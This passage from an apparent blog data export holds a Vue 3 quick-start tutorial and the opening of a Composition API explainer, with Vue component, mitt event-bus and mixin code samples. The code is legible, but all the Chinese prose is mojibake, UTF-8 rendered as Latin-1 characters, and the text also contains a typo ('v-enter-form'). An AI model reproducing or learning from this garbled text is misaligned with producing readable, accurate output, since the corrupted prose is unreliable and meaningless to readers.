ç”¨èµ·ä¾†å·²ç¶“éå¸¸æ–¹ä¾¿äº†ï¼Œä½†æ˜¯æˆ‘å€‘é‚„æ˜¯æœ‰å¾ˆç…©çš„åœ°æ–¹ï¼Œæ¯”å¦‚ï¼š\nå…ƒä»¶å¼•å…¥äº†é‚„è¦è¨»å†Šã€‚ å±¬æ€§å’Œæ–¹æ³•éƒ½è¦åœ¨ setup å‡½å¼ä¸­è¿”å›ï¼Œæœ‰çš„æ™‚å€™åƒ…ä¸€å€‹ return å°±åå¹¾è¡Œç”šè‡³å¹¾åè¡Œã€‚ \u0026hellip; ä¸æƒ³å¯«å•Šæ€éº¼è¾¦\nå¥½è¾¦ï¼Œ Vue3 å®˜æ–¹æä¾›äº† script setup èªæ³•ç³–ï¼Œåªéœ€è¦åœ¨ script æ¨™ç±¤ä¸­==æ–°å¢ setup==ï¼Œå…ƒä»¶åªéœ€å¼•å…¥ä¸ç”¨è¨»å†Šï¼Œå±¬æ€§å’Œæ–¹æ³•ä¹Ÿä¸ç”¨è¿”å›ï¼Œsetup å‡½å¼ä¹Ÿä¸éœ€è¦ï¼Œç”šè‡³ export default éƒ½ä¸ç”¨å¯«äº†ï¼Œä¸åƒ…æ˜¯è³‡æ–™ã€è¨ˆç®—å±¬æ€§å’Œæ–¹æ³•ï¼Œç”šè‡³æ˜¯è‡ªå®šç¾©æŒ‡ä»¤ä¹Ÿå¯ä»¥åœ¨æˆ‘å€‘çš„ template ä¸­è‡ªå‹•ç²å¾—ã€‚\nä½†æ˜¯é€™éº¼éç™®çš„èªæ³•ç³–ï¼Œé‚„æ˜¯ç¨å¾®æ·»åŠ äº†ä¸€é»é»å¿ƒæ™ºè² æ“”ï¼Œå› ç‚ºæ²’æœ‰äº† setup å‡½å¼ï¼Œé‚£éº¼ propsã€emitã€attrs æ€éº¼ç²å–å‘¢ï¼Œå°±è¦ä»‹ç´¹ä¸€ä¸‹æ–°çš„èªæ³•äº†ã€‚\nsetup script èªæ³•ç³–æä¾›äº†ä¸‰å€‹æ–°çš„ API ä¾†ä¾›æˆ‘å€‘ä½¿ç”¨ï¼š ==defineProps==ã€==defineEmit== å’Œ ==useContext==ã€‚\ndefinePropsï¼šç”¨ä¾†æ¥æ”¶çˆ¶å…ƒä»¶å‚³ä¾†çš„å€¼ propsã€‚ defineEmitï¼šç”¨ä¾†å®£å‘Šè§¸ç™¼çš„äº‹ä»¶è¡¨ã€‚ useContextï¼šç”¨ä¾†ç²å–å…ƒä»¶ä¸Šä¸‹æ–‡ contextã€‚ ç¨‹å¼ç¢¼æ¼”ç¤º parent.vue 1 2 3 4 5 6 7 8 9 10 11 12 13 14 \u0026lt;template\u0026gt; \u0026lt;div\u0026gt; \u0026lt;h2\u0026gt;æˆ‘æ˜¯çˆ¶å…ƒä»¶ï¼\u0026lt;/h2\u0026gt; \u0026lt;Children msg=\u0026#34;hello\u0026#34; @child-click=\u0026#34;handleClick\u0026#34; /\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script setup\u0026gt; import Children from \u0026#39;./components/children.vue\u0026#39; const handleClick = (ctx) =\u0026gt; { console.log(ctx) } \u0026lt;/script\u0026gt; children.vue 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 \u0026lt;template\u0026gt; \u0026lt;span @click=\u0026#34;sonClick\u0026#34;\u0026gt;msg: {{ props.msg }}\u0026lt;/span\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script setup\u0026gt; import { useContext, defineProps, defineEmit } from \u0026#39;vue\u0026#39; const emit = defineEmit([\u0026#39;child-click\u0026#39;]) const ctx = useContext() const props = defineProps({ msg: String, }) const sonClick = () =\u0026gt; { emit(\u0026#39;child-click\u0026#39;, ctx) } \u0026lt;/script\u0026gt; æˆ‘å€‘é»é¸ä¸€ä¸‹å­å…ƒä»¶ï¼š\nå¯ä»¥çœ‹åˆ° context è¢«åˆ—å°äº†å‡ºä¾†ï¼Œå…¶ä¸­çš„ attrsã€emitã€slotsã€expose å±¬æ€§å’Œæ–¹æ³•ä¾ç„¶å¯ä»¥ä½¿ç”¨ã€‚props ä¹Ÿå¯ä»¥è¼¸å‡ºåœ¨é é¢ä¸Šï¼Œäº‹ä»¶ä¹ŸæˆåŠŸæ´¾ç™¼ã€‚\nå…¶ä»–çŸ¥è­˜é» æ¥ä¸‹ä¾†ä»‹ç´¹ä¸€ä¸‹æˆ‘ä½¿ç”¨ Vue3 éç¨‹ä¸­é‡åˆ°çš„å•é¡Œæˆ–è€…å°æŠ€å·§ï¼Œä¸å…¨é¢ï¼Œæƒ³èµ·ä»€éº¼å°±å¯«ä»€éº¼å§ã€‚\nscript setup èªæ³•ç³–çš„å‘\né€™å€‹å¾ˆå¤šå¤§ä½¬å·²ç¶“åœ¨ Vue3 çš„ github ä¸Šæäº¤ Issues äº†ï¼Œæˆ–è¨±æœƒåœ¨ä¸ä¹…çš„å°‡ä¾†ä¿®å¾©ï¼Œä½†ç¾åœ¨é‚„æ˜¯è¦æ³¨æ„ä¸€ä¸‹ã€‚\nå¦‚æœåœ¨çˆ¶å…ƒä»¶ä¸­é€šé ref='xxx' çš„æ–¹æ³•ä¾†ç²å–å­å…ƒä»¶å¯¦ä¾‹ï¼Œé‚£éº¼å­å…ƒä»¶ä¸å¯ä»¥ä½¿ç”¨ script setup èªæ³•ç³–ï¼Œå¦å‰‡æœƒå ±éŒ¯ã€‚\nç¨‹å¼ç¢¼æ¼”ç¤º parent.vue 1 2 3 4 5 6 7 8 9 10 11 12 13 14 \u0026lt;template\u0026gt; \u0026lt;div\u0026gt; \u0026lt;h2\u0026gt;æˆ‘æ˜¯çˆ¶å…ƒä»¶ï¼\u0026lt;/h2\u0026gt; \u0026lt;Child ref=\u0026#39;son\u0026#39; /\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script setup\u0026gt; import Child from \u0026#39;./components/children.vue\u0026#39; import { ref } from \u0026#39;vue\u0026#39; const son = ref(null) console.log(\u0026#39; ~ son:\u0026#39;, son) \u0026lt;/script\u0026gt; å­å…ƒä»¶å…ˆä¸ä½¿ç”¨èªæ³•ç³–ï¼š\nchildren.vue 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 \u0026lt;template\u0026gt; \u0026lt;div\u0026gt; æˆ‘æ˜¯å­å…ƒä»¶{{msg}} \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script \u0026gt; import { ref } from \u0026#39;vue\u0026#39; export default { setup() { const msg = ref(\u0026#39;hello\u0026#39;) return { msg, } }, } ç¾åœ¨æŠŠå­å…ƒä»¶æ›æˆ script setup èªæ³•ç³–å†ä¾†è©¦ä¸€è©¦ï¼š\nchildren.vue 1 2 3 4 5 6 7 8 9 10 11 \u0026lt;template\u0026gt; \u0026lt;div\u0026gt; æˆ‘æ˜¯å­å…ƒä»¶{{msg}} \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script setup\u0026gt; import { ref } from \u0026#39;vue\u0026#39; const msg = ref(\u0026#39;hello\u0026#39;) \u0026lt;/script\u0026gt; å¯ä»¥çœ‹åˆ°ç¾åœ¨æ˜¯ç²å–ä¸åˆ°å­å…ƒä»¶å®šç¾©çš„ msg å±¬æ€§çš„ã€‚\nEmit æ´¾ç™¼äº‹ä»¶å¯ä»¥å°å¼•æ•¸é€²è¡Œé©—è­‰ parent.vue 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 \u0026lt;template\u0026gt; \u0026lt;div\u0026gt; \u0026lt;h2\u0026gt;æˆ‘æ˜¯çˆ¶å…ƒä»¶ï¼\u0026lt;/h2\u0026gt; \u0026lt;Child @sonClick=\u0026#39;sonClick\u0026#39; /\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script setup\u0026gt; import Child from \u0026#39;./components/Child.vue\u0026#39; import { ref } from \u0026#39;vue\u0026#39; const sonClick = (value) =\u0026gt; { console.log(value) } \u0026lt;/script\u0026gt; children.vue 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 \u0026lt;template\u0026gt; \u0026lt;div\u0026gt; æˆ‘æ˜¯å­å…ƒä»¶{{ msg }} \u0026lt;/div\u0026gt; \u0026lt;button @click=\u0026#34;handleClick(1)\u0026#34;\u0026gt;æˆ‘æ˜¯æŒ‰éˆ•1\u0026lt;/button\u0026gt; \u0026lt;button @click=\u0026#34;handleClick(2)\u0026#34;\u0026gt;æˆ‘æ˜¯æŒ‰éˆ•2\u0026lt;/button\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script\u0026gt; import { ref } from \u0026#39;vue\u0026#39; export default { name: \u0026#39;\u0026#39;, emits: { sonClick: (value) =\u0026gt; { if (value === 1) { return true } else { return false } }, }, setup(props, { emit }) { const msg = ref(\u0026#39;hello\u0026#39;) const handleClick = (value) =\u0026gt; { emit(\u0026#39;sonClick\u0026#39;, value) } return { msg, handleClick, } }, } \u0026lt;/script\u0026gt; æˆ‘å€‘åˆ†åˆ¥é»ä¸€ä¸‹æŒ‰éˆ•1å’ŒæŒ‰éˆ•2ï¼Œå¯ä»¥çœ‹åˆ°ç•¶æˆ‘å€‘é»äº†æŒ‰éˆ•2çš„æ™‚å€™ï¼Œæ§åˆ¶æª¯æœƒç™¼å‡ºè­¦å‘Šï¼Œä½†æ˜¯ç¨‹å¼æœƒç¹¼çºŒåŸ·è¡Œï¼Œé‚„æ²’æƒ³åˆ°ä»€éº¼é©åˆçš„æ‡‰ç”¨å ´æ™¯ï¼Œä½†æ˜¯è¦çŸ¥é“é€™å€‹çŸ¥è­˜é»ï¼Œå°å¤¥ä¼´å€‘å¯ä»¥åœ¨é€™æäº‹æƒ…ã€‚\nè·¨å…ƒä»¶é€šè¨Š mitt.js Vue2 ä¸­æ€éº¼å¯¦ç¾è·¨å…ƒä»¶é€šè¨Šå‘¢ï¼Ÿå¾ˆå¤šäººç¬¬ä¸€æƒ³æ³•å°±æ˜¯ event busã€‚ä½†æ˜¯ Vue3 ç§»é™¤äº† $onã€$onceã€$off å°è‡´ä¸èƒ½ä½¿ç”¨é€™å€‹æ–¹æ³•ã€‚ä½†æ˜¯ Vue å®˜æ–¹çµ¦å¤§å®¶æ¨è–¦äº† ==mitt.js==ï¼Œå®ƒçš„åŸç†å°±æ˜¯ event busã€‚\nmitt.js æ•™å­¸\nç¨‹å¼ç¢¼æ¼”ç¤º å…ˆå®‰è£ï¼š 1 npm i mitt -s ç„¶å¾Œå°è£æˆä¸€å€‹ hookï¼š mitt.js 1 2 3 4 import mitt from \u0026#39;mitt\u0026#39; const emitter = mitt(); export default emitter; ä½¿ç”¨ï¼š parent.vue 1 2 3 4 5 6 7 8 9 10 11 12 13 \u0026lt;template\u0026gt; \u0026lt;div\u0026gt; \u0026lt;h2\u0026gt;æˆ‘æ˜¯çˆ¶å…ƒä»¶ï¼\u0026lt;/h2\u0026gt; \u0026lt;Child1 /\u0026gt; \u0026lt;Child2 /\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script setup\u0026gt; import Child1 from \u0026#39;./components/children1.vue\u0026#39; import Child2 from \u0026#39;./components/children2.vue\u0026#39; \u0026lt;/script\u0026gt; children1 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 \u0026lt;template\u0026gt; \u0026lt;div\u0026gt; æˆ‘æ˜¯å­å…ƒä»¶1 \u0026lt;h1\u0026gt;{{msg}}\u0026lt;/h1\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script\u0026gt; import { ref, onUnmounted } from \u0026#39;vue\u0026#39; import emitter from \u0026#39;../mitt\u0026#39; export default { name: \u0026#39;\u0026#39;, setup() { // åˆå§‹åŒ– const msg = ref(\u0026#39;hello\u0026#39;) const changeMsg = () =\u0026gt; { msg.value = \u0026#39;world\u0026#39; } // ç›£è½äº‹ä»¶ï¼Œæ›´æ–°è³‡æ–™ emitter.on(\u0026#39;change-msg\u0026#39;, changeMsg) // é¡¯å¼è§£é™¤å®‰è£ onUnmounted(() =\u0026gt; { emitter.off(\u0026#39;change-msg\u0026#39;, changeMsg) }) return { msg, changeMsg, } }, } \u0026lt;/script\u0026gt; children2 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 \u0026lt;template\u0026gt; \u0026lt;div\u0026gt; æˆ‘æ˜¯å­å…ƒä»¶2 \u0026lt;/div\u0026gt; \u0026lt;button @click=\u0026#39;changeMsg\u0026#39;\u0026gt;é»é¸ä¿®æ”¹msg\u0026lt;/button\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script\u0026gt; import { ref } from \u0026#39;vue\u0026#39; import emitter from \u0026#39;../mitt\u0026#39; export default { name: \u0026#39;\u0026#39;, setup() { const changeMsg = () =\u0026gt; { emitter.emit(\u0026#39;change-msg\u0026#39;) } return { changeMsg, } }, } \u0026lt;/script\u0026gt; æ¼”ç¤º è‡ªå®šç¾©æŒ‡ä»¤ å…ˆçœ‹çœ‹ Vue2 è‡ªå®šç¾©æŒ‡ä»¤çš„é‰¤å­ï¼š\nbindï¼šç•¶æŒ‡ä»¤ç¹«çµåœ¨å°æ‡‰å…ƒç´ æ™‚è§¸ç™¼ï¼Œåªæœƒè§¸ç™¼ä¸€æ¬¡ã€‚ insertedï¼šç•¶å°æ‡‰å…ƒç´ è¢«æ’å…¥åˆ° DOM çš„çˆ¶å…ƒç´ æ™‚è§¸ç™¼ã€‚ updateï¼šç•¶å…ƒç´ æ›´æ–°æ™‚ï¼Œé€™å€‹é‰¤å­æœƒè¢«è§¸ç™¼ï¼ˆæ­¤æ™‚å…ƒç´ çš„å¾Œä»£å…ƒç´ é‚„æ²’æœ‰è§¸ç™¼æ›´æ–°ï¼‰ã€‚ componentUpdatedï¼šç•¶æ•´å€‹å…ƒä»¶ï¼ˆåŒ…æ‹¬å­å…ƒä»¶ï¼‰å®Œæˆæ›´æ–°å¾Œï¼Œé€™å€‹é‰¤å­è§¸ç™¼ã€‚ unbindï¼šç•¶æŒ‡ä»¤è¢«å¾å…ƒç´ ä¸Šç§»é™¤æ™‚ï¼Œé€™å€‹é‰¤å­æœƒè¢«è§¸ç™¼ï¼Œä¹Ÿåªè§¸ç™¼ä¸€æ¬¡ã€‚ åœ¨ Vue3 ä¸­ï¼Œå®˜æ–¹ç‚ºäº†æ›´æœ‰åŠ©æ–¼ç¨‹å¼ç¢¼çš„å¯è®€æ€§å’Œé¢¨æ ¼çµ±ä¸€ï¼ŒæŠŠè‡ªå®šç¾©æŒ‡ä»¤çš„é‰¤å­åç¨±æ”¹çš„æ›´åƒæ˜¯å…ƒä»¶ç”Ÿå‘½é€±æœŸï¼Œå„˜ç®¡ä»–å€‘æ˜¯å…©å›äº‹ï¼š\nbind =\u0026gt; beforeMountã€‚ inserted =\u0026gt; mountedã€‚ beforeUpdateï¼šæ–°çš„é‰¤å­ï¼Œæœƒåœ¨å…ƒç´ è‡ªèº«æ›´æ–°å‰è§¸ç™¼ã€‚ update =\u0026gt; ç§»é™¤ï¼ componentUpdated =\u0026gt; updatedã€‚ beforeUnmountï¼šæ–°çš„é‰¤å­ï¼Œç•¶å…ƒç´ è‡ªèº«è¢«è§£é™¤å®‰è£å‰è§¸ç™¼ã€‚ unbind =\u0026gt; unmountedã€‚ éæ¸¡å‹•ç•« é€™å€‹æ²’æœ‰ä»€éº¼å¤§çš„æ”¹å‹•ï¼Œåªæ˜¯ä¿®æ”¹äº†å…©å€‹ class åå­—ï¼Œæ­£æ˜¯å› ç‚ºæ²’æœ‰ä»€éº¼å¤§çš„æ”¹å‹•ï¼Œå°è‡´æˆ‘æ›¾ç¶“åœ¨é€™è£¡æ ½äº†å¤§è·Ÿé ­ï¼Œå¯«å®Œäº†æ€éº¼éƒ½ä¸å°ï¼Œå¾Œä¾†æŸ¥å®˜ç¶²æ‰çŸ¥é“ã€‚\nä»¥ä¸‹æ˜¯ç›´æ¥å¼•ç”¨å®˜ç¶²çš„åŸæ–‡ï¼š\nv-enter-fromï¼šå®šç¾©é€²å…¥éæ¸¡çš„é–‹å§‹ç‹€æ…‹ã€‚åœ¨å…ƒç´ è¢«æ’å…¥ä¹‹å‰ç”Ÿæ•ˆï¼Œåœ¨å…ƒç´ è¢«æ’å…¥ä¹‹å¾Œçš„ä¸‹ä¸€å¹€ç§»é™¤ã€‚ v-enter-activeï¼šå®šç¾©é€²å…¥éæ¸¡ç”Ÿæ•ˆæ™‚çš„ç‹€æ…‹ã€‚åœ¨æ•´å€‹é€²å…¥éæ¸¡çš„éšæ®µä¸­æ‡‰ç”¨ï¼Œåœ¨å…ƒç´ è¢«æ’å…¥ä¹‹å‰ç”Ÿæ•ˆï¼Œåœ¨éæ¸¡/å‹•ç•«å®Œæˆä¹‹å¾Œç§»é™¤ã€‚é€™å€‹é¡å¯ä»¥è¢«ç”¨ä¾†å®šç¾©é€²å…¥éæ¸¡çš„éç¨‹æ™‚é–“ï¼Œå»¶é²å’Œæ›²ç·šå‡½å¼ã€‚ v-enter-toï¼šå®šç¾©é€²å…¥éæ¸¡çš„çµæŸç‹€æ…‹ã€‚åœ¨å…ƒç´ è¢«æ’å…¥ä¹‹å¾Œä¸‹ä¸€å¹€ç”Ÿæ•ˆ (èˆ‡æ­¤åŒæ™‚ v-enter-from è¢«ç§»é™¤)ï¼Œåœ¨éæ¸¡/å‹•ç•«å®Œæˆä¹‹å¾Œç§»é™¤ã€‚ v-leave-fromï¼šå®šç¾©é›¢é–‹éæ¸¡çš„é–‹å§‹ç‹€æ…‹ã€‚åœ¨é›¢é–‹éæ¸¡è¢«è§¸ç™¼æ™‚ç«‹åˆ»ç”Ÿæ•ˆï¼Œä¸‹ä¸€å¹€è¢«ç§»é™¤ã€‚ v-leave-activeï¼šå®šç¾©é›¢é–‹éæ¸¡ç”Ÿæ•ˆæ™‚çš„ç‹€æ…‹ã€‚åœ¨æ•´å€‹é›¢é–‹éæ¸¡çš„éšæ®µä¸­æ‡‰ç”¨ï¼Œåœ¨é›¢é–‹éæ¸¡è¢«è§¸ç™¼æ™‚ç«‹åˆ»ç”Ÿæ•ˆï¼Œåœ¨éæ¸¡/å‹•ç•«å®Œæˆä¹‹å¾Œç§»é™¤ã€‚é€™å€‹é¡å¯ä»¥è¢«ç”¨ä¾†å®šç¾©é›¢é–‹éæ¸¡çš„éç¨‹æ™‚é–“ï¼Œå»¶é²å’Œæ›²ç·šå‡½å¼ã€‚ v-leave-toï¼šé›¢é–‹éæ¸¡çš„çµæŸç‹€æ…‹ã€‚åœ¨é›¢é–‹éæ¸¡è¢«è§¸ç™¼ä¹‹å¾Œä¸‹ä¸€å¹€ç”Ÿæ•ˆ (èˆ‡æ­¤åŒæ™‚ v-leave-from è¢«åˆªé™¤)ï¼Œåœ¨éæ¸¡/å‹•ç•«å®Œæˆä¹‹å¾Œç§»é™¤ã€‚ ç‰¹åˆ¥æ³¨æ„çš„æ˜¯ï¼š\nv-enter æ”¹æˆäº† v-enter-form\nv-leave æ”¹æˆäº† v-leave-from\nå…¶ä»–å°çŸ¥è­˜ Vue3 ç§»é™¤äº† filterã€‚ ç²å–å…ƒä»¶å¯¦ä¾‹çš„æ–¹æ³• getCurrentInstance()ï¼š\né€™å€‹æ–¹æ³•å¯ä»¥ç²å–åˆ°ç•¶å‰å…ƒä»¶çš„å¯¦ä¾‹ï¼Œç›¸ç•¶æ–¼ Vue2 ä¸­çš„ thisï¼Œä½†æ˜¯å®ƒåªåœ¨==é–‹ç™¼ç’°å¢ƒ==èµ·æ•ˆæœï¼Œæ‰“åŒ…ä»¥å¾Œæœƒå ±éŒ¯ï¼Œæ‰€ä»¥å¤§å®¶ä¸è¦ä¾è³´ getCurrentInstance æ–¹æ³•å»ç²å–å…ƒä»¶å¯¦ä¾‹ä¾†å®Œæˆä¸€äº›ä¸»è¦åŠŸèƒ½ã€‚\næ›´è©³ç´°çš„å¯ä»¥æª¢è¦–ä¸‹é¢é€™ç¯‡æ–‡ç« ï¼š\né—œæ–¼Vue3ç²å–ç•¶å‰å…ƒä»¶ä¾‹é …çš„ getCurrentInstance æ–¹æ³•çš„è£œå…… æœ€å¾Œï¼Œç•¢ç«Ÿæ˜¯å€‹äººç¸½çµï¼Œé›£å…æœƒå‡ºç¾ç´•æ¼å’ŒéŒ¯èª¤ï¼ŒæœŸå¾…å„è·¯å¤§ç¥çš„è£œå……å’Œç³¾æ­£ã€‚\nåƒè€ƒ åƒè€ƒç¶²ç«™ Vue3å®˜æ–¹ä¸­æ–‡æ–‡ä»¶ Vue3.0å…‰é€Ÿä¸Šæ‰‹ Volar - vueçµ‚æ¥µé–‹ç™¼ç¥å™¨ï¼ Vue3.0 æ–°ç‰¹æ€§ä»¥åŠä½¿ç”¨ç¶“é©—ç¸½çµ å°šçŸ½è°·2021æœ€æ–°Vue.JSæ•™ç¨‹å¿«é€Ÿå…¥é–€åˆ°å°ˆæ¡ˆå¯¦æˆ°ï¼ˆVue3/VueJSæŠ€è¡“è©³è§£ï¼‰ é‚£å€‹å¿™äº†ä¸€å¤œçš„Vue3å‹•ç•«å¾ˆå¥½ï¼Œå°±æ˜¯å¤ªçŸ­äº† ","date":"2022-08-11T00:00:00Z","image":"https://live.staticflickr.com/65535/52277578302_d4a3e0c4aa_o.png","permalink":"https://wayneblog.ga/2022-08-11/vue3-quick-start/","title":"Vue3.0 å¿«é€Ÿå…¥é–€ï¼Œçœ‹å®ŒåŸºæœ¬å¯ä»¥ä¸Šæ‰‹æé–‹ç™¼"},{"content":" åƒè€ƒç¶²ç«™\nåƒè€ƒç¶²ç«™\nå›é¡§ Option API åœ¨äº†è§£ Composition Api ä¹‹å‰ï¼Œé¦–å…ˆå›é¡§ä¸‹æˆ‘å€‘ä½¿ç”¨ Option Api é‡åˆ°çš„å•é¡Œï¼Œæˆ‘å€‘åœ¨ Vue2 ä¸­å¸¸å¸¸æœƒéœ€è¦åœ¨ç‰¹å®šçš„å€åŸŸï¼ˆdataã€methodsã€watchã€computed\u0026hellip;ï¼‰ç·¨å¯«è² è²¬ç›¸åŒåŠŸèƒ½çš„ä»£ç¢¼ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 \u0026lt;template\u0026gt; \u0026lt;div id=\u0026#34;app\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;text\u0026#34; v-model=\u0026#34;val\u0026#34; @keyup.enter=\u0026#34;addTodo\u0026#34;\u0026gt; \u0026lt;ul\u0026gt; \u0026lt;li v-for=\u0026#34;todo in todos\u0026#34; :key=\u0026#34;todo.id\u0026#34;\u0026gt;{{todo.title}}\u0026lt;/li\u0026gt; \u0026lt;/ul\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script\u0026gt; export default { data(){ return{ val:\u0026#39;\u0026#39;, todos:[ {id:0, title:\u0026#39;åƒé¥­\u0026#39;, done:false}, {id:1, title:\u0026#39;ç¡è§‰\u0026#39;, done:false}, {id:2, title:\u0026#39;lsp\u0026#39;, done:false}, ] } }, methods:{ addTodo(){ this.todos.push({ id:this.todos.length, title:this.val, done:false }) this.val = \u0026#39;\u0026#39; } } } \u0026lt;/script\u0026gt; Option Api çš„ç¼ºé™· åè¦†æ©«è·³ éš¨è‘—æ¥­å‹™è¤‡é›œåº¦è¶Šä¾†è¶Šé«˜ï¼Œä»£ç¢¼é‡æœƒä¸æ–·çš„åŠ å¤§ï¼›ç”±æ–¼ç›¸é—œæ¥­å‹™çš„ä»£ç¢¼éœ€è¦éµå¾ª option çš„é…ç½®å¯«åˆ°ç‰¹å®šçš„å€åŸŸï¼Œå°è‡´å¾ŒçºŒç¶­è­·éå¸¸çš„è¤‡é›œï¼Œä»£ç¢¼å¯è¤‡ç”¨æ€§ä¹Ÿä¸é«˜ã€‚\nç›¸ä¿¡å¤§éƒ¨åˆ†åŒå­¸éƒ½ç¶­è­·éè¶…é200è¡Œçš„ .vue çµ„ä»¶ï¼Œæ–°å¢æˆ–è€…ä¿®æ”¹ä¸€å€‹éœ€æ±‚ï¼Œå°±éœ€è¦åˆ†åˆ¥åœ¨ dataã€methodsã€computed è£¡ä¿®æ”¹ï¼Œæ»¾å‹•æ¢åå¤ä¸Šä¸‹ç§»å‹•ï¼Œæˆ‘ç¨±ä¹‹ç‚ºã€åå¤æ©«è·³ã€ï¼Œæ¯”å¦‚æˆ‘å€‘ç°¡å–®çš„åŠ å€‹æ‹è…¦é–€çš„éœ€æ±‚åŠ å€‹ç´¯åŠ å™¨ï¼Œé€™ç¨®å¯«ä»£ç¢¼ä¸Šä¸‹åå¤æ©«æ¢çš„æ„Ÿè¦ºï¼Œç›¸ä¿¡å¤§å®¶éƒ½æ‡‚çš„ï¼š 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 \u0026lt;template\u0026gt; \u0026lt;div id=\u0026#34;app\u0026#34;\u0026gt; \u0026lt;h1 @click=\u0026#34;add\u0026#34;\u0026gt;LSP {{count}}å· double is{{double}}\u0026lt;/h1\u0026gt; \u0026lt;input type=\u0026#34;text\u0026#34; v-model=\u0026#34;val\u0026#34; @keyup.enter=\u0026#34;addTodo\u0026#34;\u0026gt; \u0026lt;ul\u0026gt; \u0026lt;li v-for=\u0026#34;todo in todos\u0026#34; :key=\u0026#34;todo.id\u0026#34;\u0026gt;{{todo.title}}\u0026lt;/li\u0026gt; \u0026lt;/ul\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script\u0026gt; import Counter from \u0026#39;./counter\u0026#39; export default { mixins:[Counter], data(){ return{ count:1, val:\u0026#39;\u0026#39;, todos:[ {id:0, title:\u0026#39;åƒé¥­\u0026#39;, done:false}, {id:1, title:\u0026#39;ç¡è§‰\u0026#39;, done:false}, {id:2, title:\u0026#39;lsp\u0026#39;, done:false}, ] } }, computed: { double() { return this.count * 2 } }, methods:{ addTodo(){ this.todos.push({ id:this.todos.length, title:this.val, done:false }) this.val = \u0026#39;\u0026#39; }, add(){ this.count++ } } } \u0026lt;/script\u0026gt; mixin å’Œ this åè¦†æ©«è·³çš„æœ¬è³ªï¼Œåœ¨æ–¼åŠŸèƒ½çš„åˆ†å¡Šçµ„ç¹”ï¼Œä»¥åŠä»£ç¢¼é‡å¤ªå¤§äº†ï¼Œå¦‚æœæˆ‘å€‘èƒ½æŠŠä»£ç¢¼æ§åˆ¶åœ¨ä¸€å±ï¼Œè‡ªç„¶å°±è§£æ±ºäº†ï¼Œvue2 è£¡çš„è§£æ±ºæ–¹æ¡ˆï¼Œæ˜¯ä½¿ç”¨ mixin ä¾†æ··åˆ, æˆ‘å€‘æŠ½é›¢ä¸€å€‹ counter.jsï¼š counter.js 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 export default { data() { return { count:1 } }, computed: { double() { return this.count * 2 } }, methods:{ add(){ this.count++ } } } App.vue 1 2 3 4 5 6 7 8 import Counter from \u0026#39;./counter\u0026#39; export default { mixins:[Counter], data(){ ... }, ... } é€™æ¨£ç¢ºå¯¦æ‹†åˆ†äº†ä»£ç¢¼ï¼Œä½†æ˜¯æœ‰ä¸€å€‹å¾ˆåš´é‡çš„å•é¡Œï¼Œå°±æ˜¯ä¸æ‰“é–‹ counter.jsï¼ŒApp.vue è£¡çš„ this ä¸Šï¼Œcountã€addé€™äº›å±¬æ€§ï¼Œæ˜¯å®Œå…¨ä¸çŸ¥é“å¾å“ªä¾†çš„ï¼Œä½ ä¸çŸ¥é“æ˜¯ mixinï¼Œé‚„æ˜¯å…¨å±€ installï¼Œé‚„æ˜¯ Vue.prototype.count è¨­ç½®çš„ï¼Œæ•¸æ“šä¾†æºå®Œå…¨æ¨¡ç³Šï¼Œèª¿è©¦çˆ½æ­»ä½ ï¼Œé€™ä¹Ÿæ˜¯ option çš„ä¸€å€‹å¤§å•é¡Œï¼Œthis æ˜¯å€‹é»‘ç›’ï¼Œtemplate è£¡å¯«çš„ count å’Œ doubleï¼Œå®Œå…¨ä¸çŸ¥é“å¾å“ªä¾†çš„ã€‚\nå¦‚æœæœ‰å…©å€‹ mixinï¼Œå°±æ›´æœ‰æ„æ€äº†ï¼Œæ¯”å¦‚æˆ‘å€‘åˆæœ‰ä¸€å€‹éœ€æ±‚ï¼Œå¯¦æ™‚é¡¯ç¤ºé¼ æ¨™çš„åæ¨™ä½ç½® xï¼Œä¸¦ä¸”æœ‰ä¸€å€‹ä¹˜ä»¥ 2 çš„è¨ˆç®—å±¬æ€§æ¹Šå·§ä¹Ÿå« doubleï¼Œå†æ•´ä¸€å€‹ mixinï¼š\nuseMouse.js 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 export default { data() { return { x:0 } }, methods:{ update(e){ this.x = e.pageX } }, computed:{ double(){ return this.x*2 } }, mounted(){ window.addEventListener(\u0026#39;mousemove\u0026#39;, this.update) }, destroyed(){ window.removeEventListener(\u0026#39;mousemove\u0026#39;, this.update) } } é€™æ˜¯ä¸€å€‹ç¨ç«‹ç¶­è­·çš„ mixinï¼Œå¯èƒ½åœ¨ N å€‹åœ°æ–¹ç”¨åˆ°ï¼Œä»–æ 